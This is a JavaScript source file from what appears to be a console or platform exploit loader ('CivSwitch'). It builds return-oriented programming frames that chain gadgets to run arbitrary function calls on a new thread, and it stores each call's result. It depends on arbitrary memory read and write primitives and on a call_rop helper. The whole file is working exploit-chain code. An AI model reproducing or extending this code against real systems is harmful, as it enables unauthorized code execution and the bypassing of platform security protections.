// Worker thread frame builder.
//
// call_rop() is provided by the CivSwitch loader core; not redefined here.
//
// buildFrame() creates a pre-programmed call chain a new thread executes.
// Each step calls one function with up to 4 args and stores the return value.
//
// Memory layout:
//   +0x000  context header
//   +0x800  results array (one u64 per step)
//   +0x1000 function tables (0x100 bytes per step)
//   +gap    call stack (0x140 bytes per step)
//
// Usage:
//   var f = buildFrame([
//       { fn: F_Tick, args: [0n] },
//       { fn: IPC_SEND_DISPATCHER, args: [BigInt(h), pkt, 0x1000n, 0n] },
//   ]);
//   var slot = allocPage(0x100);
//   write64(slot, 0n);
//   call_rop(F_CreateThread, slot, 0n, GADGET_LONGJMP, f.frame);
//   call_rop(F_Sleep, 60000000n);
//   var result = readFrameResult(f.frame, 1);

const FRAME_STEP = 0x140;
const FRAME_RESULT = 0x800;
const FRAME_SENTINEL = 0xfedcba9876543210n;

function _frameAlignPage(n) {
    return Math.ceil(n / 0x1000) * 0x1000;
}

function _frameGetArg(call, k) {
    var a = call.args[k];
    return (a === undefined || a === null) ? 0n : BigInt(a);
}

// Build a ROP frame for a list of calls.
// Each call: { fn: BigInt, args: [x0, x1, x2, x3] }
// Returns: { frame: BigInt (address), size: number, count: number }
function buildFrame(calls) {
    var count = calls.length;
    var tables = 0x1000;
    var stack = _frameAlignPage(tables + count * 0x100) + 0x10000;
    var size = _frameAlignPage(stack + count * FRAME_STEP + 0x4000);
    var frame = allocPage(size);

    call_rop(GADGET_MEMSET, frame, 0n, BigInt(size));

    var put = function(off, v) {
        write64(frame + BigInt(off), BigInt(v));
    };

    put(0x10, frame + BigInt(tables));
    put(0x30, _frameGetArg(calls[0], 0));
    put(0x58, GADGET_LOAD_TABLE);
    put(0x68, frame + BigInt(stack));

    for (var i = 0; i < count; i++) {
        var table = tables + i * 0x100;
        var sp = stack + i * FRAME_STEP;

        put(table, frame + BigInt(table) + 0x10n);
        put(table + 0x80, calls[i].fn);
        put(FRAME_RESULT + i * 8, FRAME_SENTINEL);

        put(sp + 8, GADGET_CALL4);
        put(sp + 0x10, _frameGetArg(calls[i], 1));
        put(sp + 0x20, _frameGetArg(calls[i], 2));
        put(sp + 0x28, _frameGetArg(calls[i], 3));
        put(sp + 0xd8, GADGET_SAVE_RESULT);
        put(sp + 0x118, frame + BigInt(FRAME_RESULT + i * 8));

        if (i + 1 < count) {
            put(sp + 0x108, frame + BigInt(tables + (i + 1) * 0x100));
            put(sp + 0xe8, _frameGetArg(calls[i + 1], 0));
            put(sp + 0x128, GADGET_LOAD_TABLE);
        } else {
            put(sp + 0x128, F_ExitThread);
        }
    }

    return { frame: frame, size: size, count: count };
}

// Read the result of step i from a frame (BigInt, or SENTINEL if not done)
function readFrameResult(frame, i) {
    return read64(frame + BigInt(FRAME_RESULT + i * 8));
}
